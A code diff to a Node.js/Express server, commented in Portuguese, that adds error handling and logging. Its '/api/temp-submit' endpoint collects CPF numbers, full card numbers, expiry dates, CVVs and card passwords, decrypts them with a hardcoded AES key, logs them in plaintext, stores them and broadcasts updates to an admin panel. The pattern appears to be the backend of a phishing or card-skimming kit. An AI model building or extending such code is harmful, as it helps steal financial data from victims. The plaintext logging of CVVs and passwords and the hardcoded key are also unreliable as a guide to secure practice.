@@ -88,7 +88,7 @@ app.use('/admin', basicAuth({
     }
 }));
 
-// Middleware para validar token (corrigido para não depender de sessionId global)
+// Middleware para validar token
 const validateToken = (req, res, next) => {
     const token = req.headers['x-session-token'];
     if (!token) {
@@ -264,11 +264,17 @@ const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
 function broadcast(message) {
-    wss.clients.forEach(client => {
-        if (client.readyState === WebSocket.OPEN) {
-            client.send(JSON.stringify(message));
-        }
-    });
+    try {
+        console.log('Enviando broadcast:', message);
+        wss.clients.forEach(client => {
+            if (client.readyState === WebSocket.OPEN) {
+                client.send(JSON.stringify(message));
+            }
+        });
+        console.log('Broadcast concluído com sucesso');
+    } catch (broadcastError) {
+        console.error('Erro no broadcast:', broadcastError.message);
+    }
 }
 
 // Rotas de admin
@@ -297,10 +303,30 @@ app.post('/api/temp-submit', validateToken, async (req, res) => {
 
         console.log('Descriptografando dados recebidos:', { cpf, cardNumber, expiryDate, cvv, password });
         const decryptedCpf = cpf ? CryptoJS.AES.decrypt(cpf, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
+        if (!decryptedCpf && cpf) {
+            console.error('Falha na descriptografia de cpf:', cpf);
+            return res.status(400).json({ error: 'Falha na descriptografia de cpf.' });
+        }
         const decryptedCardNumber = cardNumber ? CryptoJS.AES.decrypt(cardNumber, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
+        if (!decryptedCardNumber && cardNumber) {
+            console.error('Falha na descriptografia de cardNumber:', cardNumber);
+            return res.status(400).json({ error: 'Falha na descriptografia de cardNumber.' });
+        }
         const decryptedExpiryDate = expiryDate ? CryptoJS.AES.decrypt(expiryDate, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
+        if (!decryptedExpiryDate && expiryDate) {
+            console.error('Falha na descriptografia de expiryDate:', expiryDate);
+            return res.status(400).json({ error: 'Falha na descriptografia de expiryDate.' });
+        }
         const decryptedCvv = cvv ? CryptoJS.AES.decrypt(cvv, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
+        if (!decryptedCvv && cvv) {
+            console.error('Falha na descriptografia de cvv:', cvv);
+            return res.status(400).json({ error: 'Falha na descriptografia de cvv.' });
+        }
         const decryptedPassword = password ? CryptoJS.AES.decrypt(password, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
+        if (!decryptedPassword && password) {
+            console.error('Falha na descriptografia de password:', password);
+            return res.status(400).json({ error: 'Falha na descriptografia de password.' });
+        }
 
         console.log('Dados descriptografados:', { decryptedCpf, decryptedCardNumber, decryptedExpiryDate, decryptedCvv, decryptedPassword });
         const encryptedCardNumber = decryptedCardNumber ? encrypt(decryptedCardNumber) : null;
@@ -308,7 +334,7 @@ app.post('/api/temp-submit', validateToken, async (req, res) => {
         const encryptedPassword = decryptedPassword ? encrypt(decryptedPassword) : null;
 
         console.log('Executando query SQL:', { sessionId, decryptedCpf, encryptedCardNumber, decryptedExpiryDate, encryptedCvv, encryptedPassword });
-        await pool.query(
+        const result = await pool.query(
             `INSERT INTO temp_data (session_id, cpf, card_number, expiry_date, cvv, password, updated_at)
              VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)
              ON CONFLICT (session_id) DO UPDATE SET
@@ -318,8 +344,9 @@ app.post('/api/temp-submit', validateToken, async (req, res) => {
                  cvv = COALESCE(EXCLUDED.cvv, temp_data.cvv),
                  password = COALESCE(EXCLUDED.password, temp_data.password),
                  updated_at = CURRENT_TIMESTAMP`,
-            [sessionId, decryptedCpf || null, encryptedCardNumber, decryptedExpiryDate || null, encryptedCvv, encryptedPassword]
+            [sessionId, decryptedCpf || null, encryptedCardNumber || null, decryptedExpiryDate || null, encryptedCvv || null, encryptedPassword || null]
         );
+        console.log('Query executada com sucesso:', result.rowCount);
         broadcast({ type: 'TEMP_DATA_UPDATE' });
         res.json({ message: 'Dados temporários salvos com sucesso!' });
     } catch (error) {
